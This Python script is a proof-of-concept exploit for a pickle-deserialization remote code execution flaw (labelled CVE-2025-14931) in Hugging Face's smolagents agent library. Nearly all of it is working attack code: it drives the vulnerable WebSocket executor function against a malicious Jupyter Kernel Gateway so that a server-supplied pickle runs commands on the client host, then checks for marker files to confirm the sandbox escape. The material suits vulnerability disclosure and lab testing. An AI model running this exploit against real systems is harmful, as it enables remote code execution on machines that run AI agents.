#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : smolagents Pickle Deserialization RCE (WebSocket)
# CVE            : CVE-2025-14931
# Vendor         : Hugging Face
# Product        : smolagents
# Affected       : v1.10.0 through v1.24.0
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 10.0 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-12-23
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
smolagents Pickle Deserialization RCE — Primary PoC (WebSocket via Malicious Server)

Demonstrates arbitrary code execution via unsafe pickle.loads() in smolagents
v1.10.0–v1.24.0 RemotePythonExecutor (_websocket_run_code_raise_errors).

ATTACK CHAIN:
  1. Connect to malicious Jupyter Kernel Gateway
  2. Create kernel and open WebSocket connection
  3. Send code execution request via _websocket_run_code_raise_errors()
  4. Server responds with FinalAnswerException containing malicious pickle
  5. smolagents calls pickle.loads() on payload → RCE on victim host
  6. Verify by checking for marker files created by the payload

PREREQUISITES:
  - smolagents==1.24.0 installed (victim container)
  - Malicious Jupyter Kernel Gateway running (lab's malicious-server container)
  - requests and websocket-client packages

REFERENCES:
  - CVE-2025-14931
  - https://www.zerodayinitiative.com/advisories/ZDI-25-1143/
  - https://github.com/advisories/GHSA-q9r5-6hrr-9ph7
"""

import argparse
import json
import os
import sys
import time

# ---------- Step 0: Ensure marker files don't exist from previous runs ----------
MARKER_FILES = ["/tmp/pwned", "/tmp/rce_proof.txt"]

def clean_markers():
    """Remove marker files from previous runs."""
    for f in MARKER_FILES:
        if os.path.exists(f):
            os.remove(f)
            print(f"[*] Cleaned old marker file: {f}")


def banner():
    print("=" * 70)
    print("  CVE-2025-14931 — smolagents Pickle Deserialization RCE PoC")
    print("  Vulnerable: smolagents v1.10.0 – v1.24.0")
    print("  Target: _websocket_run_code_raise_errors() — line 309")
    print("  CWE-502 | CVSS 10.0 | Sandbox Escape via pickle.loads()")
    print("=" * 70)
    print()


def exploit(server_host: str, server_port: int) -> bool:
    """
    Execute the exploit against a malicious Jupyter Kernel Gateway server.

    The server must respond to execute_request messages with a
    FinalAnswerException error containing a malicious pickle payload.

    Returns True if RCE is confirmed, False otherwise.
    """
    # We import inside the function so any import errors are caught gracefully
    try:
        import requests
        from websocket import create_connection
    except ImportError as e:
        print(f"[-] Missing dependency: {e}")
        print("    Install with: pip install requests websocket-client")
        return False

    # Import the vulnerable function from smolagents
    try:
        from smolagents.remote_executors import _websocket_run_code_raise_errors
    except ImportError:
        print("[-] smolagents not installed or remote_executors not available")
        print("    Install with: pip install smolagents==1.24.0")
        return False

    base_url = f"http://{server_host}:{server_port}"

    # -- Minimal logger that satisfies smolagents' interface --
    class PoCLogger:
        def log(self, msg, level=None):
            print(f"    [smolagents] {msg}")
        def log_error(self, msg):
            print(f"    [smolagents ERROR] {msg}")

    logger = PoCLogger()

    # ---------- Step 1: Server readiness check ----------
    print(f"[1] Checking server readiness: GET {base_url}/api/kernelspecs")
    try:
        resp = requests.get(f"{base_url}/api/kernelspecs", timeout=10)
        if resp.status_code != 200:
            print(f"[-] Unexpected status code: {resp.status_code}")
            return False
        print(f"    [+] Server is ready (HTTP {resp.status_code})")
    except requests.ConnectionError:
        print(f"[-] Cannot connect to {base_url} — is the malicious server running?")
        return False
    except requests.Timeout:
        print(f"[-] Connection timed out to {base_url}")
        return False

    # ---------- Step 2: Create a kernel ----------
    print(f"[2] Creating kernel: POST {base_url}/api/kernels")
    try:
        resp = requests.post(f"{base_url}/api/kernels", timeout=10)
        if resp.status_code != 201:
            print(f"[-] Unexpected status code: {resp.status_code}")
            return False
        kernel_id = resp.json()["id"]
        print(f"    [+] Kernel created: {kernel_id}")
    except Exception as e:
        print(f"[-] Failed to create kernel: {e}")
        return False

    # ---------- Step 3: Connect WebSocket to kernel channels ----------
    ws_url = f"ws://{server_host}:{server_port}/api/kernels/{kernel_id}/channels"
    print(f"[3] Connecting WebSocket: {ws_url}")
    try:
        ws = create_connection(ws_url, timeout=10)
        print(f"    [+] WebSocket connected")
    except Exception as e:
        print(f"[-] WebSocket connection failed: {e}")
        return False

    # ---------- Step 4: Trigger the vulnerable code path ----------
    print(f"[4] Triggering _websocket_run_code_raise_errors() ...")
    print(f"    This calls pickle.loads() on the server's response (line 309)")
    print(f"    If the server sends a malicious pickle payload, RCE happens NOW")
    print()

    try:
        # This is the actual vulnerable call. Inside _websocket_run_code_raise_errors():
        #   1. It sends an execute_request to the server
        #   2. It receives a response with msg_type="error", ename="FinalAnswerException"
        #   3. It calls: pickle.loads(base64.b64decode(msg_content.get("evalue", "")))
        #   4. The __reduce__ method in the payload executes os.system() on THIS host
        result = _websocket_run_code_raise_errors("print('hello')", ws, logger)

        print(f"    [+] Execution returned: output={result.output}, "
              f"is_final_answer={result.is_final_answer}")

        # The return value of os.system() is the exit code (0 = success),
        # which gets returned as the "result" from pickle deserialization
        if result.is_final_answer and result.output == 0:
            print(f"    [+] os.system() returned 0 (success) — payload likely executed")

    except Exception as e:
        print(f"    [!] Exception: {type(e).__name__}: {e}")
        print(f"    (This may still indicate RCE if the payload executed before the error)")

    ws.close()

    # ---------- Step 5: Verify RCE ----------
    print()
    print(f"[5] Verifying RCE — checking for marker files on THIS host:")
    rce_confirmed = False

    # Check marker file 1: /tmp/pwned
    if os.path.exists("/tmp/pwned"):
        print(f"    [!!!] /tmp/pwned EXISTS — created by attacker payload!")
        rce_confirmed = True
    else:
        print(f"    [ ] /tmp/pwned not found")

    # Check marker file 2: /tmp/rce_proof.txt
    if os.path.exists("/tmp/rce_proof.txt"):
        content = open("/tmp/rce_proof.txt").read().strip()
        print(f"    [!!!] /tmp/rce_proof.txt EXISTS — content: '{content}'")
        rce_confirmed = True
    else:
        print(f"    [ ] /tmp/rce_proof.txt not found")

    # ---------- Step 6: Print verdict ----------
    print()
    print("=" * 70)
    if rce_confirmed:
        print("  RESULT: RCE CONFIRMED — CVE-2025-14931 successfully exploited!")
        print()
        print("  The malicious server's pickle payload was deserialized by")
        print("  smolagents' _websocket_run_code_raise_errors() at line 309,")
        print("  executing arbitrary commands on the client (victim) host.")
        print()
        print("  This demonstrates a complete sandbox escape: code running in")
        print("  the sandboxed environment can execute commands on the HOST.")
    else:
        print("  RESULT: RCE NOT CONFIRMED")
        print("  The exploit may not have triggered correctly.")
        print("  Check server logs and verify the PICKLE_COMMAND env var.")
    print("=" * 70)

    return rce_confirmed


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-14931 PoC: smolagents pickle deserialization RCE"
    )
    parser.add_argument(
        "--server-host",
        default=os.environ.get("MALICIOUS_SERVER_HOST", "cve-2025-14931-malicious-server"),
        help="Malicious Jupyter Kernel Gateway hostname/IP (default: cve-2025-14931-malicious-server)"
    )
    parser.add_argument(
        "--server-port",
        type=int,
        default=int(os.environ.get("MALICIOUS_SERVER_PORT", "8888")),
        help="Malicious server port (default: 8888)"
    )
    args = parser.parse_args()

    banner()
    clean_markers()
    success = exploit(args.server_host, args.server_port)
    sys.exit(0 if success else 1)
